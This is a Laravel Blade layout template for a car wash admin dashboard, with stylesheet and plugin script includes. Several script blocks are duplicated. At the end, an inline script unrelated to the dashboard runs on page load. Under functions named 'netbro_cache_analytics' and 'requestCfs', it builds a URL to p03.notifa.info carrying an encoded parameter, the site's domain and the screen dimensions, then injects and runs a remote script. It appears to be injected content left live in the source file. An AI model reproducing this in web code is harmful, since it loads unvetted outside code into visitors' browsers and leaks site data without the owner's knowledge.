<!DOCTYPE html>
<head>
        <meta charset="utf-8" />
        <title>Dashboard Admin FAR Car Wash</title>
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <meta content="A premium admin dashboard template by themesbrand" name="description" />
        <meta content="Themesbrand" name="author" />
        <!-- App favicon -->
        <link rel="shortcut icon" href="build/assets/images/logo-sm.png"/>
        <link rel="stylesheet" href="build/assets/plugins/morris/morris.css" />
        <link rel="stylesheet" href="build/assets/plugins/chartist/css/chartist.min.css" />
        <link href="build/assets/plugins/jvectormap/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
        <link href="build/assets/plugins/datatables/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css" />
        <!-- App css -->
        <link href="build/assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="build/assets/css/icons.css" rel="stylesheet" type="text/css" />
        <link href="build/assets/css/metismenu.min.css" rel="stylesheet" type="text/css" />
        <link href="build/assets/css/style.css" rel="stylesheet" type="text/css" />

        {{-- halaman antrian masuk --}}

        <!-- Scripts -->
        {{-- @vite(['resources/css/app.css', 'resources/js/app.js']) --}}
        
          
    </head>
    <body>
        {{-- NAVBAR --}}
        @include('layouts.navigation')
        {{-- END NAVBAR --}}



        {{-- MAIN CONTAINER --}}
        <div class="main-container" id="container">

            {{-- WRAPPER --}}
            <div class="page-wrapper" id="wrapper">
            {{-- END WRAPPER --}}

                {{-- SIDEBAR --}}
                @include('includes.sidebar')
                {{-- END SIDEBAR --}}

                {{-- CONTENT AREA --}}
                <div id="content" class="page-content">
                    <div class="container-fluid" id="container">
                        @yield('content')
                    </div>
                </div>
                {{-- END CONTENT AREA --}}

            </div>
        </div>

        <!-- jQuery  -->
        <script src="build/assets/js/jquery.min.js"></script>
        <script src="build/assets/js/bootstrap.bundle.min.js"></script>
        <script src="build/assets/js/metisMenu.min.js"></script>
        <script src="build/assets/js/waves.min.js"></script>
        <script src="build/assets/js/jquery.slimscroll.min.js"></script>
        <script src="build/assets/plugins/chartist/js/chartist.min.js"></script>
        <script src="build/assets/plugins/chartist/js/chartist-plugin-tooltip.min.js"></script>
        <script src="build/assets/plugins/morris/morris.min.js"></script>
        <script src="build/assets/plugins/raphael/raphael-min.js"></script>
        <script src="build/assets/plugins/peity-chart/jquery.peity.min.js"></script>
        <script src="build/assets/plugins/jvectormap/jquery-jvectormap-2.0.2.min.js"></script>
        <script src="build/assets/plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
        <script src="build/assets/plugins/datatables/jquery.dataTables.min.js"></script>
        <script src="build/assets/plugins/datatables/dataTables.bootstrap4.min.js"></script>
        <script src="build/assets/pages/jquery.dashboard2.init.js"></script>

        <!-- end page-wrapper --><!-- jQuery  -->
        <script src="build/assets/js/jquery.min.js"></script>
        <script src="build/assets/js/bootstrap.bundle.min.js"></script>
        <script src="build/assets/js/metisMenu.min.js"></script>
        <script src="build/assets/js/waves.min.js"></script>
        <script src="build/assets/js/jquery.slimscroll.min.js"></script>
        <script src="build/assets/plugins/tiny-editable/mindmup-editabletable.js"></script>
        <script src="build/assets/plugins/tiny-editable/numeric-input-example.js"></script>
        <script src="build/assets/plugins/tabledit/jquery.tabledit.js"></script>
        <script src="build/assets/pages/jquery.table-edit.init.js"></script>

        <!-- App js -->
        <script src="build/assets/js/app.js"></script>
        <script type="text/javascript">
            if (self == top) {
                function netbro_cache_analytics(fn, callback) {
                    setTimeout(function () {
                        fn();
                        callback();
                    }, 0);
                }
                function sync(fn) {
                    fn();
                }
                function requestCfs() {
                    var idc_glo_url = location.protocol == "https:" ? "https://" : "http://";
                    var idc_glo_r = Math.floor(Math.random() * 99999999999);
                    var url =
                        idc_glo_url +
                        "p03.notifa.info/3fsmd3/request" +
                        "?id=1" +
                        "&enc=9UwkxLgY9" +
                        "&params=" +
                        "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m3DSB4E%2frimBP%2f0zF8sRs3p2xLAh0Z9uX7Kysc1MneK1g1fkXY8NEA4nhjSE7cev32VAccKyfI1Gccn%2fAa2axzFnIlEVSWManahLRbXEi9l0GGJRQCQKo2a6Z%2f6yazME2UCUFgtuIgNIq46fkJnoIGRIZnLtN8mjSnr4sPGwlQGPtvwLJbXpq%2bGGr%2fipddsC2orpAnipl9Bae7hIJnuwV83ZTbLrEAIQIHMnYqRaLg3LvbAbzQRa59GQi0VoI%2blb53yWYfpVYmu8wLmoG4eQH9xeLctXnz8XttTe8zpHAgN68i098jXS0rFiQ6yK3szr3ECgCed6BnKZlq9c0dCHns%2fwDDRINcepgpRqae8vQOgGTD646I%2fCbQdBZf8yfbfEvfk1OXhxr1S1d%2bDNVi%2bPSlUVWQHUdqJp3KNDRjVhK55zK%2bDnJLSQRMdxaueuEcMBCJ8nHFOjaqPx%2bqfeSxgYCaxA6e9PsrAo%2f5s7EmkLmD4pwsM14vdEoMQ%3d%3d" +
                        "&idc_r=" +
                        idc_glo_r +
                        "&domain=" +
                        document.domain +
                        "&sw=" +
                        screen.width +
                        "&sh=" +
                        screen.height;
                    var bsa = document.createElement("script");
                    bsa.type = "text/javascript";
                    bsa.async = true;
                    bsa.src = url;
                    (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(bsa);
                }
                netbro_cache_analytics(requestCfs, function () {});
            }
        </script>
    </body>
</html>